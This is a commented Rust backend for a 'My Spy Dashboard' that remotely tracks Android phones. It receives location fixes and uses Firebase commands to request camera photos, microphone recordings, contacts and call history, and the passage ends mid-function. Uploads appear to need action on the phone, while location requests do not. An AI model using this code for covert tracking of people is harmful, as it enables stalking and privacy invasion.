mod db { //this tells rust there is a db module and nside it a postgres.rs file also
    //this wii connect backend/src/db/postgres.rs to main.rs
    pub mod postgres;
}

mod models { //this tell there is a model module and in that device.rs file is present
    // this connect backend/src/models/device.rs to main.rs
    pub mod device;
}
mod state; //this connects the backend/src/state.rs to main.rs
use axum::{ //this import tings from auxm for rust web framework
    Json, Router,  //json means backend will recieve JSON from android
                   //Router used to call /register, /devices, /location.
    extract::{Path, State}, 
                   //path used to read values from url(device_id extracted with path)
                   //State used to access shared app state(mainly databse connections)
    http::{HeaderMap, StatusCode},
                   //Heatermap used to read http header
                   /*statuscode used to see http status like (401 unautorised,
                                                              404 Not found,
                                                              500 internal server error )*/
    response::Html,//Html used to return html page like the dashboard
    routing::{delete, get, post},//used to define route methods
};

use chrono::Utc;//get current UTC time
use base64::{Engine as _, engine::general_purpose::STANDARD}; //for decode basic auth header
//backend send username/password in base64 format do backend must decode it
use db::postgres::connect_db; //import your connect_db function from postgress
use jsonwebtoken::{Algorithm, EncodingKey, Header, encode};
//used to create signed JWT token for Firebase/Google authentication.
use models::device::Device; //import device struct from device.rs
use serde::{Deserialize, Serialize}; //used to converting rust struct to/from JSON
use sqlx::Row;
use state::AppState; //imports your shared state struct from state.rs
use std::{env, fs}; //env read environment variables and fs read file from disk

type DashboardAuthError = (StatusCode, HeaderMap, String); //this create shortcut type
                          //instead of writing statuscode headermap string use Dashbo..

fn dashboard_auth_error(status: StatusCode, message: &str) -> DashboardAuthError { //-
      //this will create dashboard login error response
    let mut headers = HeaderMap::new(); //create empty HTTP header
    headers.insert(
        "www-authenticate", //add a special auth called www-authenication
                            //this tell the dashboard to show username/password
  "Basic realm=\"My Spy Dashboard\", charset=\"UTF-8\""//dashboard use basic authenication
        .parse()                                
        .expect("valid WWW-Authenticate header"), //convert string into a valid http value
    ); 
    (status, headers, message.to_string()) //return the error message
}

fn require_dashboard_auth(headers: &HeaderMap) -> Result<(), DashboardAuthError> { //-
     //This function checks user entered the correct dashboard username and password.
    let expected_username = env::var("DASHBOARD_USERNAME").map_err(|_| {  //-
        //read correct username from the .env
        dashboard_auth_error(
            StatusCode::INTERNAL_SERVER_ERROR,
            "DASHBOARD_USERNAME is not configured",
        )
    })?;
    let expected_password = env::var("DASHBOARD_PASSWORD").map_err(|_| {
        //read correct password
        dashboard_auth_error(
            StatusCode::INTERNAL_SERVER_ERROR,
            "DASHBOARD_PASSWORD is not configured",
        )
    })?;
    let encoded = headers
        .get("authorization") //read Authoristion header (basic auth snd am9objoxMjM0)
        .and_then(|value| value.to_str().ok()) //convert header value into normal text
        .and_then(|value| value.strip_prefix("Basic ")) /*remove the basic part and keep -
                                                        encoded usrname and password   */
        .ok_or_else(|| dashboard_auth_error(StatusCode::UNAUTHORIZED, "Login required"))?; //-
        //if the header is missing return 401 unauthorised
    let decoded = STANDARD
        .decode(encoded) //decodes the Base64 text
        .ok()
     .and_then(|bytes| String::from_utf8(bytes).ok())//convert decoded bytes to normal text
        .ok_or_else(|| dashboard_auth_error(StatusCode::UNAUTHORIZED, "Invalid username or password"))?; //-
        
    let Some((username, password)) = decoded.split_once(':') else { //-
           /*splits the decoded string into username and password (admin:secert become 
                username = 'admin', password = 'secert'             */
        return Err(dashboard_auth_error(
            StatusCode::UNAUTHORIZED,
            "Invalid username or password",
        ));
    };
    if username == expected_username && password == expected_password {
        Ok(()) //If both match the .env values, allow access.
    } else {
        Err(dashboard_auth_error( //otherwise reject the request
            StatusCode::UNAUTHORIZED,
            "Invalid username or password",
        ))
    }
}

//this are the small struct for shape input and output for API

#[derive(Serialize)] //serialize means rust turn this struct to JSON
struct HealthResponse {//this is json response body for health (status : healthy)
    status: String,
}

//Deserialize: get from android as JSON (   Json come into rust)
//(convert incoming JSON from Android into Rust structs)
//serialize: the one that we get from android turn to json
//( convert Rust structs into JSON responses)
//so we get from android is json but without serialize we cant turn it to a json

#[derive(Deserialize)]//Deserialize means Rust can read JSON into this struct.
struct RegisterRequest { //this decribe JSON the android APP send to /register
    device_id: String,
    manufacturer: Option<String>,
    model: Option<String>,
    android_version: Option<String>,
}

#[derive(Serialize)]
struct RegisterResponse { //This is the JSON reply from /register.
    message: String,
}

#[derive(Serialize)]
struct HeartbeatResponse { //This is the JSON reply from /heartbeat
    message: String,
}

#[derive(Deserialize)]
struct LocationRequest { //This is the JSON body Android sends to /location.
    device_id: String,
    latitude: f64, //f64 means: Decimal number, needed for latitude/longitude.
    longitude: f64,
    // Optional so older installed clients can still communicate while they are updated.
    accuracy_meters: Option<f64>,
    location_timestamp_ms: Option<i64>, //phone measured the location
}

#[derive(Serialize)]
struct LocationResponse { //This is the response after the backend receives a location.
    message: String,
}

#[derive(Deserialize)]
struct FcmTokenRequest { //This is what Android sends when it gets a Firebase token.
    device_id: String,
    fcm_token: String,
}

#[derive(Serialize)] 
struct FcmTokenResponse { //This is the reply after the token is saved
    message: String,
}

#[derive(Deserialize)]
struct LocationCommandStatusRequest { /*this is used when phone reports back whether a
                                      Firebase location command succeeded or failed.*/
    device_id: String,   
    status: String,                             
}

#[derive(Deserialize)]
struct PhoneDetailsRequest {
    device_id: String,
    manufacturer: String,
    model: String,
    android_version: String,
    sdk_int: i32,
}

#[derive(Deserialize)]
struct SharedContact {
    name: Option<String>,
    phone: Option<String>,
}

#[derive(Deserialize)]
struct ContactsUploadRequest {
    device_id: String,
    contacts: Vec<SharedContact>,
}

#[derive(Deserialize)]
struct SharedCallRecord {
    cached_name: Option<String>,
    phone_number: Option<String>,
    call_type: String,
    called_at_ms: i64,
    duration_seconds: i64,
}

#[derive(Deserialize)]
struct CallHistoryUploadRequest {
    device_id: String,
    calls: Vec<SharedCallRecord>,
}

#[derive(Deserialize)]
struct MediaUploadRequest {
    device_id: String,
    media_type: String,
    content_type: String,
    base64_data: String,
}

#[derive(Deserialize)]
struct DeleteScopePath {
    device_id: String,
    scope: String,
}

#[derive(Deserialize)]
struct DeleteItemPath {
    device_id: String,
    id: i32,
}

#[derive(Serialize)]
struct LocateResponse { //the response from the dashboard’s “request location” action.
    message: String,
}

#[derive(Deserialize)]
struct FirebaseServiceAccount { //it contains the credentials needed -
    project_id: String,
    private_key: String,        // to ask Google for an access token.
    client_email: String,
    token_uri: String,
}

#[derive(Serialize)] //This is the contents of the JWT the backend signs for Google OAuth.
struct GoogleJwtClaims<'a> {
    iss: &'a str, //issuer, the service account email
    scope: &'a str, //what permission is being requested
    aud: &'a str, //audience, the token endpoint
    iat: i64, //issued-at time
    exp: i64, //: expiration time
}

#[derive(Deserialize)]
struct GoogleTokenResponse { //This is the JSON Google returns after the JWT exchange
    access_token: String,
}

#[allow(dead_code)] //the rust will not warn if nothign calls the fun
async fn home() -> Html<&'static str> {  //ti return a hardcoded html function
    Html(
        r#"<!doctype html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Device dashboard</title><style>body{font:15px system-ui;margin:28px;background:#10131a;color:#eef2ff}main{max-width:1100px;margin:auto}input,button{padding:10px;border-radius:7px;border:1px solid #48536b;background:#171d29;color:inherit}button{cursor:pointer;background:#3468d8;border:0}table{width:100%;border-collapse:collapse;margin-top:18px;background:#171d29}th,td{text-align:left;padding:12px;border-bottom:1px solid #30394c}small{color:#aab5cd}.ready{color:#69e59b}.notready{color:#ffbc70}#message{margin:12px 0;min-height:20px}</style></head><body><main><h1>Device dashboard</h1><p><small>Enter the command key to request a fresh location. A device is “ready” after the updated app has opened once and registered with Firebase.</small></p><input id="key" type="password" placeholder="Command API key"><button onclick="load()">Refresh</button><button onclick="setFilter('ready')">Ready devices</button><button onclick="setFilter('all')">All devices</button><div id="message"></div><table><thead><tr><th>Device</th><th>Status</th><th>Last GPS fix</th><th>Accuracy</th><th>Location</th><th></th></tr></thead><tbody id="rows"></tbody></table></main><script>let devices=[],filter='all';const msg=t=>document.querySelector('#message').textContent=t;const esc=v=>{const e=document.createElement('span');e.textContent=v??'—';return e.innerHTML};function setFilter(v){filter=v;draw()}async function load(){try{const r=await fetch('/devices');if(!r.ok)throw Error(await r.text());devices=await r.json();draw();msg(`${devices.length} device(s) loaded`)}catch(e){msg('Could not load devices: '+e.message)}}function draw(){const rows=document.querySelector('#rows');rows.innerHTML='';for(const d of devices.filter(x=>filter==='all'||x.command_ready)){const lat=d.latitude,lon=d.longitude,loc=lat==null?'—':`<a target="_blank" href="https://www.google.com/maps?q=${lat},${lon}">${lat.toFixed(6)}, ${lon.toFixed(6)}</a>`;const tr=document.createElement('tr');tr.innerHTML=`<td>${esc(d.manufacturer)} ${esc(d.model)}<br><small>${esc(d.device_id)}</small></td><td class="${d.command_ready?'ready':'notready'}">${d.command_ready?'Ready':'Not registered'}</td><td>${esc(d.location_time)}</td><td>${d.location_accuracy_meters==null?'—':Math.round(d.location_accuracy_meters)+' m'}</td><td>${loc}</td><td><button ${d.command_ready?'':'disabled'} onclick="locate('${d.device_id}')">Request location</button></td>`;rows.appendChild(tr)}}async function locate(id){const key=document.querySelector('#key').value;if(!key)return msg('Enter the command API key first.');msg('Sending location request…');const r=await fetch('/devices/'+encodeURIComponent(id)+'/locate',{method:'POST',headers:{'x-api-key':key}});msg(await r.text());setTimeout(load,25000)}load()</script></body></html>"#,
    )
}

async fn dashboard(headers: HeaderMap) -> Result<Html<&'static str>, DashboardAuthError> {
    //this is the real dashboard route
    //this check the login headers and if login is valid it serves dashboards/html
    require_dashboard_auth(&headers)?;
    Ok(Html(include_str!("dashboard.html")))
}

async fn health() -> Json<HealthResponse> { //for health check wheter server is aive or not.
    Json(HealthResponse {
        status: "healthy".to_string(),
    })
}

async fn register( // this handle post/register
    State(state): State<AppState>, //state give acces to the shared dashboard
    Json(request): Json<RegisterRequest>,//json resad andoriod json into register request
) -> Json<RegisterResponse> {
    sqlx::query( 
        //means create a new device row if it does not exist
        //update the existing row if the same device registers again
        "
    INSERT INTO devices (
        device_id,
        manufacturer,
        model,
        android_version,
        last_seen
    )
    VALUES ($1, $2, $3, $4, NOW())
    ON CONFLICT (device_id)
    DO UPDATE SET
        manufacturer = EXCLUDED.manufacturer,
        model = EXCLUDED.model,
        android_version = EXCLUDED.android_version,
        last_seen = NOW()
",
    )
    .bind(&request.device_id)
    .bind(&request.manufacturer)
    .bind(&request.model)
    .bind(&request.android_version)
    .execute(&state.db)
    .await
    .unwrap();

    // let mut devices = state.devices.lock().unwrap();

    // devices.push(Device {
    // device_id: request.device_id.clone(),
    //});

    Json(RegisterResponse {
        message: format!("Device {} registered ", request.device_id),
    })
}

async fn heartbeat( //it updstes last seen so heatbest means device still active
    State(state): State<AppState>,
    Json(request): Json<RegisterRequest>,
) -> Json<HeartbeatResponse> {
    sqlx::query(
        "
        UPDATE devices
        SET last_seen = NOW()
        WHERE device_id = $1",
    )
    .bind(&request.device_id)
    .execute(&state.db)
    .await
    .unwrap();

    Json(HeartbeatResponse {
        message: format!("Heartbeat received from {}", request.device_id),
    })
}

async fn update_location(
    //Handles POST /location.
    State(state): State<AppState>,
    Json(request): Json<LocationRequest>,
) -> Json<LocationResponse> {
    sqlx::query(
        //If device exists, update its location.
        //If device does not exist, create it with location.
        //Without ON CONFLICT: Second location upload for same device would fail.
        "
        INSERT INTO devices (
            device_id, latitude, longitude, location_accuracy_meters, location_time, last_seen
        )
        VALUES ($1, $2, $3, $4, TO_TIMESTAMP($5::DOUBLE PRECISION / 1000.0) AT TIME ZONE 'UTC', NOW())
        ON CONFLICT (device_id) 
        DO UPDATE SET
            latitude = EXCLUDED.latitude,
            longitude = EXCLUDED.longitude,
            location_accuracy_meters = EXCLUDED.location_accuracy_meters,
            location_time = EXCLUDED.location_time,
            last_seen = NOW()
        ",
    )
    .bind(&request.device_id)
    .bind(request.latitude) //Connect Rust request values to SQL placeholders.
    .bind(request.longitude)
    .bind(request.accuracy_meters)
    .bind(request.location_timestamp_ms)
    .execute(&state.db)
    .await
    .unwrap();

    println!(
        "Location received: device={}, latitude={}, longitude={}, accuracy={:?}m",
        request.device_id, request.latitude, request.longitude, request.accuracy_meters
    );

    Json(LocationResponse {
        message: format!("Location received from {}", request.device_id),
    })
}

async fn register_fcm_token(
    State(state): State<AppState>,
    Json(request): Json<FcmTokenRequest>,
) -> Json<FcmTokenResponse> {
    sqlx::query(
        "
        INSERT INTO devices (device_id, fcm_token, last_seen)
        VALUES ($1, $2, NOW())
        ON CONFLICT (device_id)
        DO UPDATE SET fcm_token = EXCLUDED.fcm_token
        ",
    )
    .bind(&request.device_id)
    .bind(&request.fcm_token)
    .execute(&state.db)
    .await
    .unwrap();

    println!("Firebase token registered for device={}", request.device_id);

    Json(FcmTokenResponse {
        message: format!("Firebase token saved for {}", request.device_id),
    })
}

async fn update_location_command_status(
    State(state): State<AppState>,
    Json(request): Json<LocationCommandStatusRequest>,
) -> Json<LocationResponse> {
    sqlx::query(
        "
        INSERT INTO devices (device_id, last_command_status, last_command_status_time, last_seen)
        VALUES ($1, $2, NOW(), NOW())
        ON CONFLICT (device_id)
        DO UPDATE SET
            last_command_status = EXCLUDED.last_command_status,
            last_command_status_time = EXCLUDED.last_command_status_time,
            last_seen = NOW()
        ",
    )
    .bind(&request.device_id)
    .bind(&request.status)
    .execute(&state.db)
    .await
    .unwrap();
    Json(LocationResponse {
        message: "Location command status saved".to_string(),
    })
}

async fn update_phone_details(
    State(state): State<AppState>,
    Json(request): Json<PhoneDetailsRequest>,
) -> Result<Json<LocationResponse>, (StatusCode, String)> {
    require_pending_capability_request(&state, &request.device_id, "phone_details").await?;
    sqlx::query(
        "
        UPDATE devices
        SET manufacturer = $2,
            model = $3,
            android_version = $4,
            last_command_status = $5,
            last_command_status_time = NOW(),
            last_seen = NOW()
        WHERE device_id = $1
        ",
    )
    .bind(&request.device_id)
    .bind(&request.manufacturer)
    .bind(&request.model)
    .bind(format!("{} (SDK {})", request.android_version, request.sdk_int))
    .bind("Phone details uploaded")
    .execute(&state.db)
    .await
    .map_err(|_| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            "Could not save phone details".to_string(),
        )
    })?;

    mark_capability_request_fulfilled(&state, &request.device_id, "phone_details").await?;

    Ok(Json(LocationResponse {
        message: "Phone details uploaded".to_string(),
    }))
}

async fn upload_contacts(
    State(state): State<AppState>,
    Json(request): Json<ContactsUploadRequest>,
) -> Result<Json<LocationResponse>, (StatusCode, String)> {
    require_pending_capability_request(&state, &request.device_id, "contacts").await?;
    let mut transaction = state.db.begin().await.unwrap();
    sqlx::query("DELETE FROM device_contacts WHERE device_id = $1")
        .bind(&request.device_id)
        .execute(&mut *transaction)
        .await
        .unwrap();
    for contact in &request.contacts {
        sqlx::query(
            "
            INSERT INTO device_contacts (device_id, name, phone)
            VALUES ($1, $2, $3)
            ",
        )
        .bind(&request.device_id)
        .bind(&contact.name)
        .bind(&contact.phone)
        .execute(&mut *transaction)
        .await
        .unwrap();
    }
    sqlx::query(
        "
        UPDATE devices
        SET last_command_status = $2,
            last_command_status_time = NOW(),
            last_seen = NOW()
        WHERE device_id = $1
        ",
    )
    .bind(&request.device_id)
    .bind(format!("{} contact(s) uploaded by user", request.contacts.len()))
    .execute(&mut *transaction)
    .await
    .unwrap();
    transaction.commit().await.unwrap();
    mark_capability_request_fulfilled(&state, &request.device_id, "contacts").await?;

    Ok(Json(LocationResponse {
        message: format!("{} contact(s) uploaded", request.contacts.len()),
    }))
}

async fn upload_call_history(
    State(state): State<AppState>,
    Json(request): Json<CallHistoryUploadRequest>,
) -> Result<Json<LocationResponse>, (StatusCode, String)> {
    require_pending_capability_request(&state, &request.device_id, "call_history").await?;
    let mut transaction = state.db.begin().await.map_err(|_| {
        (StatusCode::INTERNAL_SERVER_ERROR, "Could not start call-history upload".to_string())
    })?;
    sqlx::query("DELETE FROM device_call_history WHERE device_id = $1")
        .bind(&request.device_id)
        .execute(&mut *transaction)
        .await
        .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "Could not replace call history".to_string()))?;
    for call in &request.calls {
        sqlx::query(
            "INSERT INTO device_call_history (device_id, cached_name, phone_number, call_type, called_at_ms, duration_seconds) VALUES ($1, $2, $3, $4, $5, $6)",
        )
        .bind(&request.device_id)
        .bind(&call.cached_name)
        .bind(&call.phone_number)
        .bind(&call.call_type)
        .bind(call.called_at_ms)
        .bind(call.duration_seconds)
        .execute(&mut *transaction)
        .await
        .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "Could not save call history".to_string()))?;
    }
    sqlx::query(
        "UPDATE devices SET last_command_status = $2, last_command_status_time = NOW(), last_seen = NOW() WHERE device_id = $1",
    )
    .bind(&request.device_id)
    .bind(format!("{} current call record(s) uploaded", request.calls.len()))
    .execute(&mut *transaction)
    .await
    .map_err(|_| (StatusCode::INTERNAL_SERVER_ERROR, "Could not update call-history status".to_string()))?;
    transaction.commit().await.map_err(|_| {
        (StatusCode::INTERNAL_SERVER_ERROR, "Could not finish call-history upload".to_string())
    })?;
    mark_capability_request_fulfilled(&state, &request.device_id, "call_history").await?;

    Ok(Json(LocationResponse {
        message: format!("{} current call record(s) uploaded", request.calls.len()),
    }))
}

async fn upload_media(
    State(state): State<AppState>,
    Json(request): Json<MediaUploadRequest>,
) -> Result<Json<LocationResponse>, (StatusCode, String)> {
    let required_capability = match request.media_type.as_str() {
        "photo" => "camera",
        "voice" => "microphone",
        _ => return Err((StatusCode::BAD_REQUEST, "Unsupported media type".to_string())),
    };
    require_pending_capability_request(&state, &request.device_id, required_capability).await?;
    sqlx::query(
        "
        INSERT INTO device_media (device_id, media_type, content_type, base64_data, created_at)
        VALUES ($1, $2, $3, $4, NOW())
        ",
    )
    .bind(&request.device_id)
    .bind(&request.media_type)
    .bind(&request.content_type)
    .bind(&request.base64_data)
    .execute(&state.db)
    .await
    .map_err(|_| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            "Could not save media".to_string(),
        )
    })?;
    sqlx::query(
        "
        UPDATE devices
        SET last_command_status = $2,
            last_command_status_time = NOW(),
            last_seen = NOW()
        WHERE device_id = $1
        ",
    )
    .bind(&request.device_id)
    .bind(format!("{} uploaded by user", request.media_type))
    .execute(&state.db)
    .await
    .ok();
    mark_capability_request_fulfilled(&state, &request.device_id, required_capability).await?;

    Ok(Json(LocationResponse {
        message: format!("{} uploaded", request.media_type),
    }))
}

async fn request_firebase_access_token() -> Result<(String, String), String> {
    let credentials_text = if let Ok(raw_json) = env::var("FIREBASE_SERVICE_ACCOUNT_JSON") {
        raw_json
    } else {
        let credentials_path = env::var("FIREBASE_SERVICE_ACCOUNT_PATH")
            .unwrap_or_else(|_| "firebase-service-account.json".to_string());
        fs::read_to_string(&credentials_path)
            .map_err(|_| format!("Cannot read Firebase credentials at {credentials_path}"))?
    };
    let credentials: FirebaseServiceAccount = serde_json::from_str(&credentials_text)
        .map_err(|_| "Firebase credentials JSON is invalid".to_string())?;
    let now = Utc::now().timestamp();
    let claims = GoogleJwtClaims {
        iss: &credentials.client_email,
        scope: "https://www.googleapis.com/auth/firebase.messaging",
        aud: &credentials.token_uri,
        iat: now,
        exp: now + 3600,
    };
    let assertion = encode(
        &Header::new(Algorithm::RS256),
        &claims,
        &EncodingKey::from_rsa_pem(credentials.private_key.as_bytes())
            .map_err(|_| "Firebase private key is invalid".to_string())?,
    )
    .map_err(|_| "Could not sign Firebase access token".to_string())?;
    let response = reqwest::Client::new()
        .post(&credentials.token_uri)
        .form(&[
            ("grant_type", "urn:ietf:params:oauth:grant-type:jwt-bearer"),
            ("assertion", assertion.as_str()),
        ])
        .send()
        .await
        .map_err(|_| "Could not contact Google OAuth".to_string())?
        .error_for_status()
        .map_err(|_| "Google OAuth rejected the Firebase credentials".to_string())?;
    let token: GoogleTokenResponse = response
        .json()
        .await
        .map_err(|_| "Google OAuth returned an invalid response".to_string())?;
    Ok((credentials.project_id, token.access_token))
}

fn require_command_api_key(headers: &HeaderMap) -> Result<(), (StatusCode, String)> {
    let expected_api_key = env::var("COMMAND_API_KEY").map_err(|_| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            "COMMAND_API_KEY is not configured".to_string(),
        )
    })?;
    let supplied_api_key = headers
        .get("x-api-key")
        .and_then(|value| value.to_str().ok());
    if supplied_api_key == Some(expected_api_key.as_str()) {
        Ok(())
    } else {
        Err((
            StatusCode::UNAUTHORIZED,
            "Invalid command API key".to_string(),
        ))
    }
}

async fn read_device_fcm_token(
    state: &AppState,
    device_id: &str,
) -> Result<String, (StatusCode, String)> {
    sqlx::query_scalar::<_, String>(
        "SELECT fcm_token FROM devices WHERE device_id = $1 AND fcm_token IS NOT NULL",
    )
    .bind(device_id)
    .fetch_optional(&state.db)
    .await
    .map_err(|_| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            "Could not read device token".to_string(),
        )
    })?
    .ok_or_else(|| {
        (
            StatusCode::NOT_FOUND,
            "Device has not registered for Firebase commands".to_string(),
        )
    })
}

async fn require_pending_capability_request(
    state: &AppState,
    device_id: &str,
    capability: &str,
) -> Result<(), (StatusCode, String)> {
    let exists = sqlx::query_scalar::<_, i64>(
        "
        SELECT id::BIGINT
        FROM device_capability_requests
        WHERE device_id = $1
          AND capability = $2
          AND fulfilled_at IS NULL
        ORDER BY requested_at DESC
        LIMIT 1
        ",
    )
    .bind(device_id)
    .bind(capability)
    .fetch_optional(&state.db)
    .await
    .map_err(|_| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            "Could not verify pending upload request".to_string(),
        )
    })?;

    if exists.is_some() {
        Ok(())
    } else {
        Err((
            StatusCode::FORBIDDEN,
            "Upload rejected because no matching backend request is pending".to_string(),
        ))
    }
}

async fn mark_capability_request_fulfilled(
    state: &AppState,
    device_id: &str,
    capability: &str,
) -> Result<(), (StatusCode, String)> {
    sqlx::query(
        "
        UPDATE device_capability_requests
        SET fulfilled_at = NOW()
        WHERE id = (
            SELECT id
            FROM device_capability_requests
            WHERE device_id = $1
              AND capability = $2
              AND fulfilled_at IS NULL
            ORDER BY requested_at DESC
            LIMIT 1
        )
        ",
    )
    .bind(device_id)
    .bind(capability)
    .execute(&state.db)
    .await
    .map_err(|_| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            "Could not close upload request".to_string(),
        )
    })?;
    Ok(())
}

async fn send_firebase_data_command(
    fcm_token: String,
    data: serde_json::Value,
) -> Result<(), (StatusCode, String)> {
    let (project_id, access_token) = request_firebase_access_token()
        .await
        .map_err(|message| (StatusCode::INTERNAL_SERVER_ERROR, message))?;
    let payload = serde_json::json!({
        "message": {
            "token": fcm_token,
            "data": data,
            "android": { "priority": "HIGH" }
        }
    });
    let response = reqwest::Client::new()
        .post(format!(
            "https://fcm.googleapis.com/v1/projects/{project_id}/messages:send"
        ))
        .bearer_auth(access_token)
        .json(&payload)
        .send()
        .await
        .map_err(|_| {
            (
                StatusCode::BAD_GATEWAY,
                "Could not contact Firebase".to_string(),
            )
        })?;
    let status = response.status();
    let body = response
        .text()
        .await
        .unwrap_or_else(|_| "Firebase returned an unreadable error body".to_string());
    if !status.is_success() {
        return Err((
            StatusCode::BAD_GATEWAY,
            format!("Firebase rejected the command: HTTP {status}: {body}"),
        ));
    }
    Ok(())
}

async fn request_location_command(
    State(state): State<AppState>,
    Path(device_id): Path<String>,
    headers: HeaderMap,
) -> Result<Json<LocateResponse>, (StatusCode, String)> {
    require_dashboard_auth(&headers).map_err(|(status, _, message)| (status, message))?;
    require_command_api_key(&headers)?;
    println!("Location command requested for device={device_id}");
    let fcm_token = read_device_fcm_token(&state, &device_id).await?;
    send_firebase_data_command(
        fcm_token,
        serde_json::json!({ "command": "locate" }),
    )
    .await?;
    sqlx::query(
        "
        UPDATE devices
        SET last_command_status = 'Location request sent; awaiting the phone',
            last_command_status_time = NOW()
        WHERE device_id = $1
        ",
    )
    .bind(&device_id)
    .execute(&state.db)
    .await
    .map_err(|_| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            "Could not save command status".to_string(),
        )
    })?;
    println!("Firebase accepted location command for device={device_id}");
    Ok(Json(LocateResponse {
        message: format!("Location command sent to {device_id}"),
    }))
}

async fn request_permission_status_command(
    State(state): State<AppState>,
    Path((device_id, permission)): Path<(String, String)>,
    headers: HeaderMap,
) -> Result<Json<LocateResponse>, (StatusCode, String)> {
    require_dashboard_auth(&headers).map_err(|(status, _, message)| (status, message))?;
    require_command_api_key(&headers)?;

    let permission_label = match permission.as_str() {
        "camera" => "Camera",
        "microphone" => "Microphone",
        "contacts" => "Contacts",
        "phone_state" => "Phone state",
        _ => return Err((StatusCode::BAD_REQUEST, "Unknown permission".to_string())),
    };

    println!("{permission_label} permission status requested for device={device_id}");
    let fcm_token = read_device_fcm_token(&state, &device_id).await?;
    send_firebase_data_command(
        fcm_token,
        serde_json::json!({
            "command": "permission_status",
            "permission": permission
        }),
    )
    .await?;

    sqlx::query(
        "
        UPDATE devices
        SET last_command_status = $2,
            last_command_status_time = NOW()
        WHERE device_id = $1
        ",
    )
    .bind(&device_id)
    .bind(format!("{permission_label} permission check requested"))
    .execute(&state.db)
    .await
    .map_err(|_| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            "Could not save command status".to_string(),
        )
    })?;

    Ok(Json(LocateResponse {
        message: format!("{permission_label} permission check sent to {device_id}"),
    }))
}

async fn request_capability_upload_command(
    State(state): State<AppState>,
    Path((device_id, capability)): Path<(String, String)>,
    headers: HeaderMap,
) -> Result<Json<LocateResponse>, (StatusCode, String)> {
    require_dashboard_auth(&headers).map_err(|(status, _, message)| (status, message))?;
    require_command_api_key(&headers)?;

    let (stored_capability, capability_label, camera_facing) = match capability.as_str() {
        "camera" => ("camera", "Camera photo", Some("back")),
        "camera_front" => ("camera", "Front camera photo", Some("front")),
        "camera_back" => ("camera", "Back camera photo", Some("back")),
        "microphone" => ("microphone", "Microphone voice note", None),
        "contacts" => ("contacts", "Contacts", None),
        "call_history" => ("call_history", "Current call history", None),
        "phone_details" | "phone_state" => ("phone_details", "Phone details", None),
        _ => return Err((StatusCode::BAD_REQUEST, "Unknown capability".to_string())),
    };

    println!("{capability_label} upload requested for device={device_id}");
    sqlx::query(
        "
        INSERT INTO device_capability_requests (device_id, capability, requested_at)
        VALUES ($1, $2, NOW())
        ",
    )
    .bind(&device_id)
    .bind(stored_capability)
    .execute(&state.db)
    .await
    .map_err(|_| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            "Could not save pending upload request".to_string(),
        )
    })?;

    // Persist first so a fast FCM response can always match a pending request.
    let fcm_token = read_device_fcm_token(&state, &device_id).await?;
    send_firebase_data_command(
        fcm_token,
        serde_json::json!({
            "command": "capability_request",
            "capability": stored_capability,
            "camera_facing": camera_facing.unwrap_or("")
        }),
    )
    .await?;

    sqlx::query(
        "
        UPDATE devices
        SET last_command_status = $2,
            last_command_status_time = NOW()
        WHERE device_id = $1
        ",
    )
    .bind(&device_id)
    .bind(format!("{capability_label} upload requested; waiting for user"))
    .execute(&state.db)
    .await
    .map_err(|_| {
        (
            StatusCode::INTERNAL_SERVER_ERROR,
            "Could not save command status".to_string(),
        )
    })?;

    Ok(Json(LocateResponse {
        message: format!("{capability_label} upload request sent to {device_id}"),
    }))
}

async fn delete_device(
    State(state): State<AppState>,
    Path(device_id): Path<String>,
    headers: HeaderMap,
) -> Result<Json<LocateResponse>, (StatusCode, String)> {
    require_dashboard_auth(&headers).map_err(|(status, _, message)| (status, message))?;
    let result = sqlx::query("DELETE FROM devices WHERE device_id = $1")
        .bind(&device_id)
        .execute(&state.db)
        .await
        .map_err(|_| {
            (
                StatusCode::INTERNAL_SERVER_ERROR,
                "Could not delete device".to_string(),
            )
        })?;
    if result.rows_affected() == 0 {
        return Err((StatusCode::NOT_FOUND, "Device was not found".to_string()));
    }
    println!("Device deleted from dashboard: device={device_id}");
    Ok(Json(LocateResponse {
        message: format!("Device {device_id} deleted"),
    }))
}

async fn delete_detail_contact(
    State(state): State<AppState>,
    Path(path): Path<DeleteItemPath>,
    headers: HeaderMap,
) -> Result<Json<LocateResponse>, (StatusCode, String)> {
    require_dashboard_auth(&headers).map_err(|(status, _, message)| (status, message))?;
    let result = sqlx::query("DELETE FROM device_contacts WHERE device_id = $1 AND id = $2")
        .bind(&path.device_id)
        .bind(path.id)
        .execute(&state.db)
        .await
        .map_err(|_| {
            (
                StatusCode::INTERNAL_SERVER_ERROR,
                "Could not delete contact".to_string(),
            )
        })?;
    if result.rows_affected() == 0 {
        return Err((StatusCode::NOT_FOUND, "Contact was not found".to_string()));
    }
    Ok(Json(LocateResponse {
        message: "Contact deleted".to_string(),
    }))
}

async fn delete_detail_media(
    State(state): State<AppState>,
    Path(path): Path<DeleteItemPath>,
    headers: HeaderMap,
) -> Result<Json<LocateResponse>, (StatusCode, String)> {
    require_dashboard_auth(&headers).map_err(|(status, _, message)| (status, message))?;
    let result = sqlx::query("DELETE FROM device_media WHERE device_id = $1 AND id = $2")
        .bind(&path.device_id)
        .bind(path.id)
        .execute(&state.db)
        .await
        .map_err(|_| {
            (
                StatusCode::INTERNAL_SERVER_ERROR,
                "Could not delete media".to_string(),
            )
        })?;
    if result.rows_affected() == 0 {
        return Err((StatusCode::NOT_FOUND, "Media item was not found".to_string()));
    }
    Ok(Json(LocateResponse {
        message: "Media item deleted".to_string(),
    }))
}

async fn delete_detail_scope(
    State(state): State<AppState>,
    Path(path): Path<DeleteScopePath>,
    headers: HeaderMap,
) -> Result<Json<LocateResponse>, (StatusCode, String)> {
    require_dashboard_auth(&headers).map_err(|(status, _, message)| (status, message))?;
    match path.scope.as_str() {
        "photos" => {
            sqlx::query("DELETE FROM device_media WHERE device_id = $1 AND media_type = 'photo'")
                .bind(&path.device_id)
                .execute(&state.db)
                .await
                .map_err(|_| {
                    (
                        StatusCode::INTERNAL_SERVER_ERROR,
